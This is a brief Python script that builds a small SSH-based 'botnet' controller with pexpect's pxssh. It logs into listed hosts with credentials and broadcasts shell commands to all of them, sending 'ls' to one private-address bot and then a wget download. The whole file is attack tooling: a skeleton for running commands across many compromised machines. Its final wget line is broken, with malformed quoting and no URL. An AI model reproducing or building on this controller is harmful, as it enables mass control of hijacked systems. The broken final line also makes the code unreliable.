from pexpect import pxssh

class Bot:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure.')
            print(e)


    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print(f'Output from {bot.host}\n{attack}')

botnet = []

def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

add_bot('10.0.0.59', '', '')

command_bots('ls')

command_bots("""wget  -O /Users/Owner/Desktop/ """"")